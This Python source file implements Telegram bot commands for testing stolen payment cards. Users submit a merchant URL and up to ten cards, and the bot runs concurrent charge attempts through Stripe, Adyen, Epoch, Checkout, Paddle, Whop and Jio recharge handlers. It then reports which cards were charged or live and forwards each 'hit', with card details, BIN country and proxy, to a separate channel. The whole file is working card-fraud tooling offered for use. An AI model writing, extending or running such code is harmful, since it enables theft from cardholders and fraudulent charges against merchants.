import asyncio
import re
from telegram import Update
from telegram.ext import ContextTypes
from cards import parse_line
import worker, db, config


def _fmt_result(r: dict) -> str:
    s = r["status"]
    emoji = {"CHARGED": "✅", "LIVE": "🟢", "3DS_CHALLENGE": "🔐",
             "CAPTCHA": "🧩", "DECLINED": "❌", "ERROR": "⚠️"}.get(s, "•")
    card = r["card"].get("formatted", "?")
    ms = r.get("response_time", 0)
    dc = r.get("decline_code") or "-"
    err = (r.get("error") or "-")[:80]
    return f"{emoji} `{card}` — *{s}* ({ms:.1f}s)\n   `{dc}` — {err}"


async def _forward_hit(ctx: ContextTypes.DEFAULT_TYPE, r: dict):
    if not config.HIT_CHANNEL_ID:
        return
    try:
        await ctx.bot.send_message(
            chat_id=config.HIT_CHANNEL_ID,
            text=(f"💳 *{r['status']}* — {r['gateway']}\n"
                  f"`{r['card'].get('formatted','?')}`\n"
                  f"brand={r.get('brand','?')} bin={r.get('bin_country','?')}\n"
                  f"ms={r.get('response_time',0):.1f} proxy={r.get('proxy_raw') or 'none'}"),
            parse_mode="Markdown",
        )
    except Exception:
        pass


def _gather_cards(args: list, start_idx: int):
    """Parse cards from args[start_idx:]. Returns (good_cards, bad_lines)."""
    good, bad = [], []
    for raw in args[start_idx:]:
        p = parse_line(raw)
        if p:
            good.append(p)
        elif raw.strip():
            bad.append(raw[:30])
    return good, bad


async def _execute_and_report(update: Update, ctx: ContextTypes.DEFAULT_TYPE,
                              user_id: int, gateway: str, target_label: str,
                              cards: list, runner_coro):
    """Shared runner: fires all cards concurrently, edits one message with results."""
    if not cards:
        return await update.message.reply_text("No valid cards parsed.")
    if len(cards) > 10:
        return await update.message.reply_text(f"Max 10 cards per command (got {len(cards)}).")

    msg = await update.message.reply_text(
        f"🔨 {gateway} → {target_label}\n"
        f"Queued {len(cards)} card(s). Checking...",
        parse_mode="Markdown",
    )

    results = await asyncio.gather(
        *[runner_coro(c) for c in cards], return_exceptions=True
    )

    lines, charged = [], 0
    for i, r in enumerate(results, 1):
        if isinstance(r, Exception):
            lines.append(f"⚠️ `{cards[i-1].get('formatted','?')}` — {type(r).__name__}: {str(r)[:60]}")
            continue
        if r.get("status") == "CHARGED":
            charged += 1
            await _forward_hit(ctx, r)
        lines.append(_fmt_result(r))

    header = f"*{charged}/{len(cards)} charged* — {gateway}\n\n"
    body = header + "\n".join(lines)
    if len(body) > 3900:
        body = body[:3900] + "\n…"
    try:
        await msg.edit_text(body, parse_mode="Markdown")
    except Exception:
        await update.message.reply_text(body[:3900], parse_mode="Markdown")


# ═══════════════════════════════════════════════════════════════════
#  GATEWAY COMMANDS — inline cards
# ═══════════════════════════════════════════════════════════════════

def _make_gateway_cmd(gateway: str, needs_email: bool = False):
    """Factory: /<gw> <url> [email] <card1> ... <card10>"""
    async def _cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        u = update.effective_user
        await db.upsert_user(u.id, u.username or u.first_name or "")
        if await db.is_banned(u.id):
            return
        if not ctx.args:
            usage = (f"/{gateway} <url> <email> <card1> ... <card10>"
                     if needs_email
                     else f"/{gateway} <url> <card1> ... <card10>")
            return await update.message.reply_text(f"Usage: `{usage}`", parse_mode="Markdown")

        url = ctx.args[0].strip()
        card_start = 1

        if needs_email:
            if len(ctx.args) < 3:
                return await update.message.reply_text(
                    f"Usage: `/{gateway} <url> <email> <card1> ... <card10>`",
                    parse_mode="Markdown")
            # optional: pass email into engine later — for now skip validation
            card_start = 2

        cards, bad = _gather_cards(ctx.args, card_start)

        if bad:
            await update.message.reply_text(f"⚠️ Skipped {len(bad)} malformed card(s).")

        async def _runner(card):
            return await worker.run_hit(u.id, url, card, gateway=gateway)

        await _execute_and_report(
            update, ctx, u.id, gateway, url, cards, _runner
        )
    return _cmd


cmd_ch       = _make_gateway_cmd("stripe")
cmd_adyen    = _make_gateway_cmd("adyen")
cmd_epoch    = _make_gateway_cmd("epoch")
cmd_checkout = _make_gateway_cmd("checkout")
cmd_paddle   = _make_gateway_cmd("paddle")
cmd_whop     = _make_gateway_cmd("whop", needs_email=True)


async def cmd_jio(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Usage: /jio <phone> <amount> <card1> ... <card10>"""
    u = update.effective_user
    await db.upsert_user(u.id, u.username or u.first_name or "")
    if await db.is_banned(u.id):
        return
    if len(ctx.args) < 3:
        return await update.message.reply_text(
            "Usage: `/jio <phone> <amount> <card1> ... <card10>`",
            parse_mode="Markdown")

    phone = ctx.args[0].strip()
    try:
        amount = float(ctx.args[1])
    except ValueError:
        return await update.message.reply_text("Amount must be numeric.")

    cards, bad = _gather_cards(ctx.args, 2)
    if bad:
        await update.message.reply_text(f"⚠️ Skipped {len(bad)} malformed card(s).")

    async def _runner(card):
        return await worker.run_jio(u.id, phone, amount, card)

    await _execute_and_report(
        update, ctx, u.id, "jio", f"{phone} ₹{amount:.0f}", cards, _runner
    )


# ═══════════════════════════════════════════════════════════════════
#  Legacy reply handler — kept as no-op so old bot.py registrations
#  don't crash. Remove once you patch bot.py (see below).
# ═══════════════════════════════════════════════════════════════════

async def on_reply(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    return